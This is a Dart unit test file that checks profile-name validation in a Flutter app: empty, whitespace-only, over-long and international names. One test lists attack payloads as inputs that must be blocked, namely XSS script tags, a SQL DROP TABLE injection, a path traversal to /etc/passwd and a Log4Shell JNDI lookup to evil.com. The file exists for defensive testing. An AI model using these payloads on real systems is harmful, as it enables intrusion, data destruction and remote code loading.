import 'package:flutter_test/flutter_test.dart';
import 'package:ai_personas_app/services/profile_service.dart';

/// FT-216: Tests for profile name validation fixes
/// 
/// These tests verify that empty profile names are properly rejected
/// and that validation works correctly in both onboarding and profile screens.
void main() {
  group('FT-216: Profile Name Validation', () {
    group('ProfileService.validateProfileName', () {
      test('should reject empty strings', () {
        expect(ProfileService.validateProfileName(''), 'Name cannot be empty');
      });

      test('should reject whitespace-only strings', () {
        expect(ProfileService.validateProfileName('   '), 'Name cannot be empty');
        expect(ProfileService.validateProfileName('\t'), 'Name cannot be empty');
        expect(ProfileService.validateProfileName('\n'), 'Name cannot be empty');
        expect(ProfileService.validateProfileName(' \t \n '), 'Name cannot be empty');
      });

      test('should accept valid names', () {
        expect(ProfileService.validateProfileName('John'), null);
        expect(ProfileService.validateProfileName('Alice Smith'), null);
        expect(ProfileService.validateProfileName('José'), null);
        expect(ProfileService.validateProfileName('李明'), null);
      });

      test('should trim whitespace before validation', () {
        expect(ProfileService.validateProfileName('  John  '), null);
        expect(ProfileService.validateProfileName('\tAlice\n'), null);
      });

      test('should reject names that are too long', () {
        final longName = 'a' * 51; // 51 characters
        expect(
          ProfileService.validateProfileName(longName),
          'Name must be 50 characters or less',
        );
      });

      test('should accept names at the length limit', () {
        final maxLengthName = 'a' * 50; // Exactly 50 characters
        expect(ProfileService.validateProfileName(maxLengthName), null);
      });

      test('should reject names with invalid characters', () {
        expect(
          ProfileService.validateProfileName('John<script>'),
          'Name contains invalid characters',
        );
        expect(
          ProfileService.validateProfileName('Alice>alert'),
          'Name contains invalid characters',
        );
        expect(
          ProfileService.validateProfileName('Bob"quote'),
          'Name contains invalid characters',
        );
        expect(
          ProfileService.validateProfileName('Carol\\backslash'),
          'Name contains invalid characters',
        );
        expect(
          ProfileService.validateProfileName('Dave/slash'),
          'Name contains invalid characters',
        );
      });

      test('should accept names with safe special characters', () {
        expect(ProfileService.validateProfileName("John O'Connor"), null);
        expect(ProfileService.validateProfileName('Mary-Jane'), null);
        expect(ProfileService.validateProfileName('José María'), null);
        expect(ProfileService.validateProfileName('李明.Wang'), null);
        expect(ProfileService.validateProfileName('Anna (Smith)'), null);
      });

      test('should handle edge cases', () {
        // Single character
        expect(ProfileService.validateProfileName('A'), null);
        
        // Numbers
        expect(ProfileService.validateProfileName('John123'), null);
        
        // Unicode characters
        expect(ProfileService.validateProfileName('Müller'), null);
        expect(ProfileService.validateProfileName('Ñoño'), null);
      });
    });

    group('ProfileService.setProfileName', () {
      test('should reject empty names', () async {
        // setProfileName should not save empty names
        // Since it returns early, we can't directly test the rejection
        // but we can verify the validation logic is called
        expect(ProfileService.validateProfileName(''), isNotNull);
      });

      test('should accept valid names for saving', () async {
        // Valid names should pass validation
        expect(ProfileService.validateProfileName('Valid Name'), null);
      });

      test('should trim names before validation', () async {
        // Names with surrounding whitespace should be trimmed
        expect(ProfileService.validateProfileName('  Valid Name  '), null);
      });
    });

    group('Validation Integration Scenarios', () {
      test('should prevent empty name submission in forms', () {
        // Simulate form validation scenarios
        final testCases = [
          {'input': '', 'shouldBlock': true},
          {'input': '   ', 'shouldBlock': true},
          {'input': '\t\n', 'shouldBlock': true},
          {'input': 'Valid Name', 'shouldBlock': false},
          {'input': '  Valid Name  ', 'shouldBlock': false},
        ];

        for (final testCase in testCases) {
          final input = testCase['input'] as String;
          final shouldBlock = testCase['shouldBlock'] as bool;
          final validationResult = ProfileService.validateProfileName(input);
          
          if (shouldBlock) {
            expect(
              validationResult,
              isNotNull,
              reason: 'Input "$input" should be blocked but validation passed',
            );
          } else {
            expect(
              validationResult,
              null,
              reason: 'Input "$input" should be allowed but validation failed: $validationResult',
            );
          }
        }
      });

      test('should handle onboarding flow validation', () {
        // Test scenarios specific to onboarding name setup
        
        // Initial state (empty field) should show error
        expect(ProfileService.validateProfileName(''), 'Name cannot be empty');
        
        // User starts typing
        expect(ProfileService.validateProfileName('J'), null);
        expect(ProfileService.validateProfileName('Jo'), null);
        expect(ProfileService.validateProfileName('John'), null);
        
        // User clears field
        expect(ProfileService.validateProfileName(''), 'Name cannot be empty');
        
        // User enters whitespace only
        expect(ProfileService.validateProfileName('   '), 'Name cannot be empty');
      });

      test('should handle profile edit dialog validation', () {
        // Test scenarios specific to profile editing
        
        // Existing name validation (could be empty from legacy data)
        expect(ProfileService.validateProfileName(''), 'Name cannot be empty');
        
        // User clears existing name
        expect(ProfileService.validateProfileName(''), 'Name cannot be empty');
        
        // User enters new valid name
        expect(ProfileService.validateProfileName('New Name'), null);
        
        // User enters invalid name
        expect(
          ProfileService.validateProfileName('Name<script>'),
          'Name contains invalid characters',
        );
      });

      test('should provide consistent error messages', () {
        // Verify error messages are consistent and user-friendly
        
        final emptyError = ProfileService.validateProfileName('');
        expect(emptyError, 'Name cannot be empty');
        
        final whitespaceError = ProfileService.validateProfileName('   ');
        expect(whitespaceError, 'Name cannot be empty');
        
        final longNameError = ProfileService.validateProfileName('a' * 51);
        expect(longNameError, 'Name must be 50 characters or less');
        
        final invalidCharError = ProfileService.validateProfileName('test<>');
        expect(invalidCharError, 'Name contains invalid characters');
      });

      test('should support real-world name patterns', () {
        // Test common real-world name patterns
        final validNames = [
          'John Smith',
          'Mary-Jane Watson',
          "O'Connor",
          'José María',
          '李明',
          'Mohammed bin Rashid',
          'Jean-Claude Van Damme',
          'Dr. Smith',
          'Anna (Annie) Johnson',
          'Müller',
          'Ñoño',
          'Åsa',
          'Øystein',
        ];

        for (final name in validNames) {
          expect(
            ProfileService.validateProfileName(name),
            null,
            reason: 'Valid name "$name" should pass validation',
          );
        }
      });

      test('should block malicious input patterns', () {
        // Test security-related validation
        final maliciousInputs = [
          '<script>alert("xss")</script>',
          'javascript:alert(1)',
          '"><script>alert(1)</script>',
          "'; DROP TABLE users; --",
          '../../../etc/passwd',
          '\${jndi:ldap://evil.com/a}',
        ];

        for (final input in maliciousInputs) {
          final result = ProfileService.validateProfileName(input);
          expect(
            result,
            isNotNull,
            reason: 'Malicious input "$input" should be blocked',
          );
        }
      });
    });

    group('UI Integration Validation', () {
      test('should enable/disable save button correctly', () {
        // Simulate UI button state logic
        bool shouldEnableButton(String input) {
          return ProfileService.validateProfileName(input) == null;
        }

        // Button should be disabled for invalid inputs
        expect(shouldEnableButton(''), false);
        expect(shouldEnableButton('   '), false);
        expect(shouldEnableButton('a' * 51), false);
        expect(shouldEnableButton('test<script>'), false);

        // Button should be enabled for valid inputs
        expect(shouldEnableButton('John'), true);
        expect(shouldEnableButton('  John  '), true);
        expect(shouldEnableButton('Mary-Jane'), true);
      });

      test('should provide immediate validation feedback', () {
        // Simulate real-time validation as user types
        final typingSequence = ['', 'J', 'Jo', 'Joh', 'John', '', '   ', 'Jane'];
        final expectedResults = [
          'Name cannot be empty', // ''
          null, // 'J'
          null, // 'Jo'
          null, // 'Joh'
          null, // 'John'
          'Name cannot be empty', // ''
          'Name cannot be empty', // '   '
          null, // 'Jane'
        ];

        for (int i = 0; i < typingSequence.length; i++) {
          final input = typingSequence[i];
          final expected = expectedResults[i];
          final actual = ProfileService.validateProfileName(input);
          
          expect(
            actual,
            expected,
            reason: 'Step $i: Input "$input" should return "$expected" but got "$actual"',
          );
        }
      });
    });
  });
}
